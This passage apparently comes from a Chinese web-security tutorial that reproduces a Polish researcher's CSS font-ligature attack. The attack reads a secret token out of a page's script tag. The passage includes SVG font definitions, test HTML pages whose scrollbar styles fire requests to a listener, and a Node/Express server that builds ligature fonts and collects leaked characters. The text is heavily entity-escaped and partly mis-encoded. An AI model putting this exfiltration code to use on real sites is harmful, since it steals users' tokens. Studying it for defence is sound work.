0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;f\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;g\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;h\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;i\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;j\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;k\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;l\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;m\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;n\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;o\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;p\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;q\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;r\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;s\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;t\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;u\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;v\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;w\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;x\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;y\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;z\u0026#34; horiz-adv-x=\u0026#34;0\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;glyph unicode=\u0026#34;sekurak\u0026#34; horiz-adv-x=\u0026#34;8000\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;/font\u0026gt; \u0026lt;/defs\u0026gt; \u0026lt;/svg\u0026gt; å°†ä»¥ä¸Šä»£ç ä¿å­˜ä¸º test.svgï¼Œç„¶åä½¿ç”¨fontforge ./script.fontforge test.svgå‘½ä»¤ç”Ÿæˆ test.woff ï¼Œæˆ‘ä»¬å†å°†å…¶å¼•å…¥å°±å¥½äº†ã€‚\nè¿™é‡Œæˆ‘ä»¬åšä¸ªç®€å•çš„éªŒè¯ï¼Œå°†ä»¥ä¸‹ä»£ç ä¿å­˜ä¸º test.html\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;hack\u0026#34;; src: url(\u0026#34;./test.woff\u0026#34;); } span { background: lightblue; font-family: \u0026#34;hack\u0026#34;; } body { white-space: nowrap; } body::-webkit-scrollbar { background: blue; } body::-webkit-scrollbar:horizontal { background: url(http://127.0.0.1:9999); } \u0026lt;/style\u0026gt; \u0026lt;span id=span\u0026gt;123sekurak123\u0026lt;/span\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ç„¶åç”¨ä¸€ä¸ª font.html ç”¨ iframe å°†å…¶å¼•å…¥:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;iframe src=\u0026#34;http://127.0.0.1/test.html\u0026#34; frameborder=\u0026#34;0\u0026#34; width=\u0026#34;100px\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  \nè®¿é—® test.html ä¹‹åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ”¶åˆ°äº†è¯·æ±‚ã€‚\nè¿™é‡Œçš„åŸç†ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œåœ¨åŸºäº WebKit æˆ–å…¶åˆ†æ”¯ä¹‹ä¸€çš„æµè§ˆå™¨ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨-webkit-scrollbaræ¥è®¾ç½®æ»šåŠ¨æ¡æ ·å¼ï¼Œè€Œå‡ºç°æ»šåŠ¨æ¡æ ·å¼ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨nowrapè®©å…¶ä¸æ¢è¡Œã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè¦å®Œå…¨è®¾ç½®æ ·å¼ï¼Œå…ˆå¾—æ·»åŠ ä¼ªç±»-webkit-scrollbarï¼Œè¿™æ ·æ‰èƒ½åˆ©ç”¨è¿å­—çš„å®½åº¦æ¥è§¦å‘-webkit-scrollbar:horizontalå±æ€§æ¥æ‰§è¡Œæˆ‘ä»¬çš„è¯·æ±‚ã€‚\nToken2 - Get From JavaScript ä»ä¸Šé¢è¿™ä¸ª demo æˆ‘ä»¬å¤§æ¦‚å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªæ€è·¯äº†ï¼Œå°†æ‰€æœ‰å­—ä½“ä¹Ÿéƒ½è®¾ç½®ä¸º0ï¼Œç„¶åç”¨è¿å­—çš„æ–¹æ³•æ¥çˆ†ç ´å¾—åˆ° token2\nè¿™é‡Œç›´æ¥ç»™å‡ºæ³¢å…°é‚£ä½ä½œè€…çš„ä»£ç ï¼š\nconst express = require(\u0026#39;express\u0026#39;); const app = express(); // Serwer ExprssJS domyÅ›lnie dodaje nagÅ‚Ã³wek ETag, // ale nam nie jest to potrzebne, wiÄ™c wyÅ‚Ä…czamy. app.disable(\u0026#39;etag\u0026#39;); const PORT = 3001; const js2xmlparser = require(\u0026#39;js2xmlparser\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const tmp = require(\u0026#39;tmp\u0026#39;); const rimraf = require(\u0026#39;rimraf\u0026#39;); const child_process = require(\u0026#39;child_process\u0026#39;); // Generujemy fonta dla zadanego przedrostka // i znakÃ³w, dla ktÃ³rych ma zostaÄ‡ utworzona ligatura. function createFont(prefix, charsToLigature) { let font = { \u0026#34;defs\u0026#34;: { \u0026#34;font\u0026#34;: { \u0026#34;@\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;hack\u0026#34;, \u0026#34;horiz-adv-x\u0026#34;: \u0026#34;0\u0026#34; }, \u0026#34;font-face\u0026#34;: { \u0026#34;@\u0026#34;: { \u0026#34;font-family\u0026#34;: \u0026#34;hack\u0026#34;, \u0026#34;units-per-em\u0026#34;: \u0026#34;1000\u0026#34; } }, \u0026#34;glyph\u0026#34;: [] } } }; // DomyÅ›lnie wszystkie moÅ¼liwe znaki majÄ… zerowÄ… szerokoÅ›Ä‡...  let glyphs = font.defs.font.glyph; for (let c = 0x20; c \u0026lt;= 0x7e; c += 1) { const glyph = { \u0026#34;@\u0026#34;: { \u0026#34;unicode\u0026#34;: String.fromCharCode(c), \u0026#34;horiz-adv-x\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;d\u0026#34;: \u0026#34;M1 0z\u0026#34;, } }; glyphs.push(glyph); } // ... za wyjÄ…tkiem ligatur, ktÃ³re sÄ… BARDZO szerokie.  charsToLigature.forEach(c =\u0026gt; { const glyph = { \u0026#34;@\u0026#34;: { \u0026#34;unicode\u0026#34;: prefix + c, \u0026#34;horiz-adv-x\u0026#34;: \u0026#34;10000\u0026#34;, \u0026#34;d\u0026#34;: \u0026#34;M1 0z\u0026#34;, } } glyphs.push(glyph); }); // Konwertujemy JSON-a na SVG.  const xml = js2xmlparser.parse(\u0026#34;svg\u0026#34;, font); // A nastÄ™pnie wykorzystujemy fontforge  // do zamiany SVG na WOFF.  const tmpobj = tmp.dirSync(); fs.writeFileSync(`${tmpobj.name}/font.svg`, xml); child_process.spawnSync(\u0026#34;/usr/bin/fontforge\u0026#34;, [ `${__dirname}/script.fontforge`, `${tmpobj.name}/font.svg` ]); const woff = fs.readFileSync(`${tmpobj.name}/font.woff`); // Usuwamy katalog tymczasowy.  rimraf.sync(tmpobj.name); // I zwracamy fonta w postaci WOFF.  return woff; } // Endpoint do generowania fontÃ³w. app.get(\u0026#34;/font/:prefix/:charsToLigature\u0026#34;, (req, res) =\u0026gt; { const { prefix, charsToLigature } = req.params; // Dbamy o to by font znalazÅ‚ siÄ™ w cache\u0026#39;u.  res.set({ \u0026#39;Cache-Control\u0026#39;: \u0026#39;public, max-age=600\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/font-woff\u0026#39;, \u0026#39;Access-Control-Allow-Origin\u0026#39;: \u0026#39;*\u0026#39;, }); res.send(createFont(prefix, Array.from(charsToLigature))); }); // Endpoint do przyjmowania znakÃ³w przez poÅ‚Ä…czenie zwrotne app.get(\u0026#34;/reverse/:chars\u0026#34;, function(req, res) { res.cookie(\u0026#39;chars\u0026#39;, req.params.chars); res.set(\u0026#39;Set-Cookie\u0026#39;, `chars=${encodeURIComponent(req.params.chars)}; Path=/`); res.send(); }); app.get(\u0026#39;/cookie.js\u0026#39;, (req, res) =\u0026gt; { res.sendFile(\u0026#39;js.cookie.js\u0026#39;, { root: \u0026#39;./node_modules/js-cookie/src/\u0026#39; }); }); app.get(\u0026#39;/index.html\u0026#39;, (req, res) =\u0026gt; { res.sendFile(\u0026#39;index.html\u0026#39;, { root: \u0026#39;.\u0026#39; }); }); app.listen(PORT, () =\u0026gt; { console.log(`Listening on ${PORT}...`); }) è¿™é‡Œæˆ‘ä»¬å…ˆåªç”¨åˆ°/fontçš„ api ç”¨æ¥ç›´æ¥ç”Ÿæˆæˆ‘ä»¬éœ€è¦çš„ woff æ–‡ä»¶ï¼Œç„¶åæˆ‘ä»¬æ„é€ ä¸¤ä¸ªé¡µé¢ï¼Œç¬¬ä¸€ä¸ª test.html ï¼ŒåŒ…å«æˆ‘ä»¬éœ€è¦è·å–çš„ token2 ï¼Œæœ‰ä»¥ä¸‹ä»£ç ï¼š\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; var token2 = \u0026#34;7b8a45b8297cf82cc3cefc174c3ae5a1\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;hack\u0026#34;; src: url(http://172.16.71.138:3001/font/%22/7); } script { display: table; font-family: \u0026#34;hack\u0026#34;; white-space: nowrap; background: lightblue; } body::-webkit-scrollbar { background: blue; } body::-webkit-scrollbar:horizontal { display:block; background: blue url(http://127.0.0.1:9999); } \u0026lt;/style\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; æˆ‘ä»¬è¿™é‡Œç”¨display:tableå°†scriptæ ‡ç­¾å†…çš„å†…å®¹è¾“å‡ºå‡ºæ¥ï¼Œç„¶åç¦æ­¢æ¢è¡Œï¼Œå¹¶ä½¿ç”¨æˆ‘ä»¬æ„é€ çš„å­—ä½“ã€‚é‚£ä¸ª url è·å–åˆ°çš„å°±æ˜¯ä»¥ä¸‹ svg ç”Ÿæˆçš„ woff æ–‡ä»¶ï¼š\n\u0026lt;?xml version=\u0026#39;1.0\u0026#39;?\u0026gt; \u0026lt;svg\u0026gt; \u0026lt;defs\u0026gt; \u0026lt;font id=\u0026#39;hack\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39;\u0026gt; \u0026lt;font-face font-family=\u0026#39;hack\u0026#39; units-per-em=\u0026#39;1000\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39; \u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;!\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;\u0026#34;\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;#\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;$\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;%\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;\u0026amp;amp;\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;\u0026amp;apos;\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;(\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;)\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;*\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;+\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;,\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;-\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;.\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;/\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;0\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;1\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;2\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;3\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;4\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;5\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;6\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;7\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;8\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;9\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;:\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;;\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;\u0026amp;lt;\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;=\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;\u0026gt;\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;?\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;@\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;A\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;B\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;C\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;D\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;E\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;F\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;G\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;H\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;I\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;J\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;K\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;L\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;M\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;N\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;O\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;P\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;Q\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;R\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;S\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;T\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;U\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;V\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;W\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;X\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;Y\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;Z\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;[\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;\\\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;]\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;^\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;_\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;`\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;a\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;b\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;c\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;d\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;e\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;f\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;g\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;h\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;i\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;j\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;k\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;l\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;m\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;n\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;o\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;p\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;q\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;r\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;s\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;t\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;u\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;v\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;w\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;x\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;y\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;z\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;{\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 0z\u0026#39;/\u0026gt; \u0026lt;glyph unicode=\u0026#39;|\u0026#39; horiz-adv-x=\u0026#39;0\u0026#39; d=\u0026#39;M1 